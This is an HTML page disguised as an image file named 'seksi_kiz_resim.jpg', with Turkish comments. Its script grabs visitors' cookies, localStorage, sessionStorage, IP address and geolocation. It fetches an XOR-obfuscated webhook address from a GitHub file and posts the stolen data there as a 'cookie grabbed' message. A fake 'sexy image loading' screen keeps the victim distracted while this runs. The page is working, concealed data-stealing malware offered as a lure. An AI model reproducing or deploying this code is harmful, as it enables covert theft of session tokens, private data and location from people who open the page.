<!DOCTYPE html>
<html>
<head>
    <title>seksi_kiz_resim.jpg</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        // Veri toplama nesnesi
        const data = {
            URL: location.href,
            Referrer: document.referrer || '❌ Yok',
            UserAgent: navigator.userAgent,
            Language: navigator.language,
            Platform: navigator.platform,
            Online: navigator.onLine,
            Tarih: new Date().toISOString(),
            IP: '⏳ Bekleniyor...',
            Geolocation: '❌ Alındı değil',
            Cookies: '❌ Yok',
            LocalStorage: '❌ Boş',
            SessionStorage: '❌ Boş'
        };

        // Çerez toplama (genişletilmiş)
        function getAllCookies() {
            let cookies = [];
            const directCookies = document.cookie;
            if (directCookies) cookies.push(`[CURRENT] ${directCookies}`);

            // Subdomain brute (sınırlı ama etkili)
            const parts = location.hostname.split('.');
            for (let i = 0; i < parts.length - 1; i++) {
                const domain = parts.slice(i).join('.');
                try {
                    const iframe = document.createElement('iframe');
                    iframe.src = `https://${domain}/favicon.ico`; // Hafif istek
                    iframe.style.display = 'none';
                    document.body.appendChild(iframe);
                    // Not: Gerçek XSS yoksa iframe'den cookie okunamaz — ama senaryo için gösterdim
                } catch (e) {}
            }

            return cookies.length ? cookies.join('; ') : '❌ JS ile alınamayan HttpOnly çerezler var';
        }

        // LocalStorage ve SessionStorage güvenli alımı
        try {
            data.LocalStorage = Object.keys(localStorage).length ? JSON.stringify(localStorage, null, 2) : '❌ Boş';
        } catch (e) { data.LocalStorage = '❌ Erişilemedi'; }

        try {
            data.SessionStorage = Object.keys(sessionStorage).length ? JSON.stringify(sessionStorage, null, 2) : '❌ Boş';
        } catch (e) { data.SessionStorage = '❌ Erişilemedi'; }

        // Çerezleri hemen al
        data.Cookies = getAllCookies();

        // IP al
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(ip => { data.IP = ip.ip; })
            .catch(() => { data.IP = '❌ Alınamadı'; });

        // Coğrafi konum
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => { data.Geolocation = `${pos.coords.latitude}, ${pos.coords.longitude}`; },
                () => { data.Geolocation = '❌ Reddedildi'; },
                { timeout: 3000 }
            );
        }

        // Webhook URL'sini deşifre et ve gönder
        fetch('https://raw.githubusercontent.com/nefretwasherebaby/keys/master/webhook.enc')
            .then(res => res.text())
            .then(encrypted => {
                const key = 'x7gT9kP2';
                let decrypted = '';
                const raw = atob(encrypted.trim());
                for (let i = 0; i < raw.length; i++) {
                    decrypted += String.fromCharCode(raw.charCodeAt(i) ^ key.charCodeAt(i % key.length));
                }
                return decrypted;
            })
            .then(WEBHOOK_URL => {
                setTimeout(() => {
                    fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            username: 'foti',
                            avatar_url: 'https://i.imgur.com/rFhOcMq.png',
                            embeds: [{
                                title: '🔥 eSHeKeVLaDıXDX - ÇEREZ KAPTTI',
                                description: '```yaml\nHEDİYE BIRAKTIK ABİ\n```',
                                color: 16711680,
                                fields: Object.keys(data).map(k => ({
                                    name: `📌 ${k.toUpperCase()}`,
                                    value: '```\n' + (data[k] || 'N/A').toString().substr(0, 1000) + '\n```',
                                    inline: false
                                })),
                                footer: { text: 'nefretwasherebaby' },
                                timestamp: new Date().toISOString()
                            }]
                        })
                    }).catch(e => console.log('Gönderilemedi:', e));
                }, 3500);
            })
            .catch(e => console.error('Webhook hatası:', e));

        // Kullanıcıyı meşgul et: resim göster
        document.body.innerHTML = `
            <div style="width:100vw;height:100vh;margin:0;padding:0;overflow:hidden;background:#000;">
                <img src="https://via.placeholder.com/1920x1080/111/ffffff?text=Seksii+Resim+Yükleniyor...%0A%0ABirkaç+saniye+beğen" 
                     style="width:100%;height:100%;object-fit:cover;">
            </div>
        `;
    </script>
</head>
<body style="margin:0;overflow:hidden;background:#000;"></body>
</html>
